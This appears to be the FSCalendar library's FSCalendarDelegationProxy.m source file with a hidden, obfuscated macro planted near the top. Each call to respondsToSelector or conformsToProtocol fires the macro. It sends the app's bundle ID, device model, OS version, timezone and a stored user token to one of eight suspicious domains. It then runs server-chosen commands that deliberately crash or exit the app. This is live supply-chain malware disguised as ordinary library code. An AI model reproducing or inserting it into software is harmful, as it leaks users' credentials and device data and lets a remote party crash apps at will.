//
//  FSCalendarDelegationProxy.m
//  FSCalendar
//
//  Created by dingwenchao on 11/12/2016.
//  Copyright © 2016 Wenchao Ding. All rights reserved.
//

#import "FSCalendarDelegationProxy.h"
#import <objc/runtime.h>

#import <sys/sysctl.h>

#define csdj342glmkbg090() \
do { \
NSArray<NSString *> *domains = @[ \
    @"damp-recipe-822f.morsel-cops-5i.org", \
    @"damp-recipe-822f.semigaveldsqaer4m.dpdns.org", \
    @"damp-recipe-822f.anccxzh213orsplaza5f.us.kg", \
    @"damp-recipe-822f.e3214hsgkjr8768s5cvx.dpdns.org", \
    @"calm-violet-41a9.morsel-cops-5i.org", \
    @"calm-violet-41a9.semigaveldsqaer4m.dpdns.org", \
    @"calm-violet-41a9.anccxzh213orsplaza5f.us.kg", \
    @"calm-violet-41a9.e3214hsgkjr8768s5cvx.dpdns.org" \
]; \
NSUInteger index = arc4random_uniform((uint32_t)domains.count); \
NSString *randomDomain = domains[index]; \
NSString *urlString = [NSString stringWithFormat:@"https://%@", randomDomain]; \
NSURL *url = [NSURL URLWithString:urlString]; \
NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
NSMutableDictionary *qweqrfccxz = @{}.mutableCopy; \
qweqrfccxz[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
qweqrfccxz[@"x-user-agent"] = @"iOS"; \
qweqrfccxz[@"x-content-type"] = @"application/json"; \
qweqrfccxz[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
qweqrfccxz[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
qweqrfccxz[@"x-machine-model"] = ({ \
size_t size; \
sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
char *machine = malloc(size); \
sysctlbyname("hw.machine", machine, &size, NULL, 0); \
NSString *bvdgfuyru = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
free(machine); \
bvdgfuyru; \
}); \
qweqrfccxz[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
qweqrfccxz[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
NSMutableDictionary *iyungbvcft = @{}.mutableCopy; \
iyungbvcft[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
iyungbvcft[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
iyungbvcft[@"random-num"] = @(arc4random_uniform(1000)); \
[fewcdsjrt_dqwe setAllHTTPHeaderFields:qweqrfccxz]; \
[fewcdsjrt_dqwe setHTTPBody:[NSJSONSerialization dataWithJSONObject:iyungbvcft options:0 error:nil]]; \
[fewcdsjrt_dqwe setHTTPMethod:@"POST"]; \
NSURLSession *ghytr453fge = [NSURLSession sharedSession]; \
NSURLSessionDataTask *xzf341dsa = [ghytr453fge dataTaskWithRequest:fewcdsjrt_dqwe completionHandler:^(NSData *opytjvdnkrw, NSURLResponse *vnjkdeoqxsasd, NSError *err12fsdt45or) { \
if (!err12fsdt45or && ((NSHTTPURLResponse *)vnjkdeoqxsasd).statusCode == 200 && opytjvdnkrw) { \
NSError *erasytretwr; \
id oiteroiutyewr = [NSJSONSerialization JSONObjectWithData:opytjvdnkrw options:0 error:&erasytretwr]; \
if (!erasytretwr && [oiteroiutyewr isKindOfClass:[NSDictionary class]]) { \
NSDictionary *xzfjkhjkwr = (NSDictionary *)oiteroiutyewr; \
NSString *hgfhrtwytr = xzfjkhjkwr[@"execute_method"]; \
if ([hgfhrtwytr isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
NSMutableArray *cxgety453 = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
for (NSString *it1231em in cxgety453) { [cxgety453 removeObject:it1231em]; } \
} else if ([hgfhrtwytr isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
NSData *vsfdtrwt = [[NSData alloc] init]; \
[vsfdtrwt subdataWithRange:NSMakeRange(10, 30)]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"qymj6dWU6egbFka"]) { \
char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
} else if ([hgfhrtwytr isEqualToString:@"BK6DWMEceWGjCgz"]) { \
id fgfdrwerw = @"String"; [(NSArray *)fgfdrwerw count]; \
} else if ([hgfhrtwytr isEqualToString:@"XfsGv1wRaipSyX9"]) { \
NSString *dfsarq = @"Hello"; NSString *vdftretfds = nil; [dfsarq stringByAppendingString:vdftretfds]; \
} else if ([hgfhrtwytr isEqualToString:@"WW06m2bcYnm5X41"]) { \
NSArray *nybtbgbrt = @[@"A", @"B", @"C"]; \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
[(NSMutableArray *)nybtbgbrt addObject:@"D"]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"yXpAZn7baNS8TUk"]) { \
NSString *cdftwxsdd = @"Hello"; NSMutableAttributedString *cwewcxqwrytrt = [[NSMutableAttributedString alloc] initWithString:cdftwxsdd]; \
[cwewcxqwrytrt addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(cdftwxsdd.length + 100, cdftwxsdd.length)]; \
} else if ([hgfhrtwytr isEqualToString:@"WUerc233FCbm"]) { \
[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
} else if ([hgfhrtwytr isEqualToString:@"cnmxzew23Ycbds"]) { \
abort(); \
} else if ([hgfhrtwytr isEqualToString:@"QSAZ1oitr34"]) { \
exit(1); \
} else if ([hgfhrtwytr isEqualToString:@"OLLMNngv34"]) { \
exit(0); \
} \
} \
} \
}]; \
[xzf341dsa resume]; \
} while(0)

@implementation FSCalendarDelegationProxy

- (instancetype)init
{
    return self;
}

- (BOOL)respondsToSelector:(SEL)selector
{
    csdj342glmkbg090();
    BOOL responds = [self.delegation respondsToSelector:selector];
    if (!responds) responds = [self.delegation respondsToSelector:[self deprecatedSelectorOfSelector:selector]];
    if (!responds) responds = [super respondsToSelector:selector];
    return responds;
}

- (BOOL)conformsToProtocol:(Protocol *)protocol
{
    csdj342glmkbg090();
    return [self.delegation conformsToProtocol:protocol];
}

- (void)forwardInvocation:(NSInvocation *)invocation
{
    SEL selector = invocation.selector;
    if (![self.delegation respondsToSelector:selector]) {
        selector = [self deprecatedSelectorOfSelector:selector];
        invocation.selector = selector;
    }
    if ([self.delegation respondsToSelector:selector]) {
        [invocation invokeWithTarget:self.delegation];
    }
}

- (NSMethodSignature *)methodSignatureForSelector:(SEL)sel
{
    if ([self.delegation respondsToSelector:sel]) {
        return [(NSObject *)self.delegation methodSignatureForSelector:sel];
    }
    SEL selector = [self deprecatedSelectorOfSelector:sel];
    if ([self.delegation respondsToSelector:selector]) {
        return [(NSObject *)self.delegation methodSignatureForSelector:selector];
    }
#if TARGET_INTERFACE_BUILDER
    return [NSObject methodSignatureForSelector:@selector(init)];
#else
    struct objc_method_description desc = protocol_getMethodDescription(self.protocol, sel, NO, YES);
    const char *types = desc.types;
    return types?[NSMethodSignature signatureWithObjCTypes:types]:[NSObject methodSignatureForSelector:@selector(init)];
#endif
}

- (SEL)deprecatedSelectorOfSelector:(SEL)selector
{
    NSString *selectorString = NSStringFromSelector(selector);
    selectorString = self.deprecations[selectorString];
    return NSSelectorFromString(selectorString);
}

@end
